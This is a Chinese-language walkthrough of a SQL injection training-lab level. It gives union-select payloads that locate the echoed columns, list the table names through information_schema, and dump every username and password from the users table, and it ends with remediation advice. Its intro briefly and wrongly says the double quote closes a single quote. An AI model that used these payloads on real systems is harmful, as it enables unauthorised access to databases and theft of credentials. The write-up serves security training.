## 一、靶场信息
- **漏洞类型**：基于联合查询的 SQL 注入。
- **防御机制**：导图提示为 `BLIND`（盲注）和 `HPP`（参数污染），但实际测试发现页面存在明确的数字回显，且可以通过双引号直接闭合，完全不需要参数污染。
- **通关思路**：使用 `?id=-1"` 闭合单引号，利用 `union select` 进行联合查询。

## 二、核心绕过思路（大白话解析）

这关的导图极具迷惑性，写着“盲注（Blind）”，但实战中只要用双引号 `"` 闭合前置条件，页面就会老老实实把数据打印出来。这证明联合查询在这里是完全可行且最高效的。

## 三、详细操作步骤与 Payload 解析

### 第一步：探测回显点

**Payload：**
```text
?id=-1" union select 1,2,3 --+
```

**回显现象：**
页面显示数字 `2` 和 `3`，确认存在 3 列回显。

**大白话解析：**
*   **`id=-1"`**：这里的 `-1` 让原查询失效（查不到这个用户），紧接着的双引号 `"` 是闭合后台语法的“钥匙”。说明这关后台是用双引号包裹变量的。
*   **`union select 1,2,3`**：经典的联合查询测试，相当于告诉数据库：“顺便再把 1、2、3 这三列打印出来给我看看”。
*   **`--+`**：注释符，把后台原本跟着的 `LIMIT 0,1` 给注释掉，防止语法报错。

### 第二步：爆库名与表名

**Payload：**
```text
?id=-1" union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

**回显现象：**
页面显示 `security` 以及表名 `emails, referrers, uagents, users`。

**大白话解析：**
*   **`database()`**：放在第 2 列，用来打印当前所在的数据库名，也就是 `security`。
*   **`group_concat(table_name)`**：放在第 3 列，这是一个“打包机”。它去 MySQL 的通讯录（`information_schema.tables`）里，把 `security` 库下的所有表名（`table_schema=database()`）用逗号连成一行显示出来。
*   这一步直接帮你锁定了目标：`users` 表。

### 第三步：直接脱库提取数据

**Payload：**
```text
?id=-1" union select 1,group_concat(username),group_concat(password) from users --+
```

**回显现象：**
页面直接渲染出所有用户账号和密码的拼接字符串，包含 `admin:p@ssw0rd` 等历史数据。

**大白话解析：**
*   这一步直接冲进 `users` 表。
*   **`group_concat(username)`**：把所有人的用户名打包成一行，放在第 2 列（Login name 回显位）显示。
*   **`group_concat(password)`**：把所有人的密码打包成一行，放在第 3 列（Password 回显位）显示。
*   这样页面就会把账号和密码分别列出来，非常直观。

## 四、核心防御机制（Remediation）
- **预编译语句（PDO/MySQLi）**：参数化查询，彻底隔离代码与数据，无论怎么闭合都无法注入。
- **关闭详细报错和回显**：生产环境不应该把数据库的执行结果或详细报错直接反馈给前端。
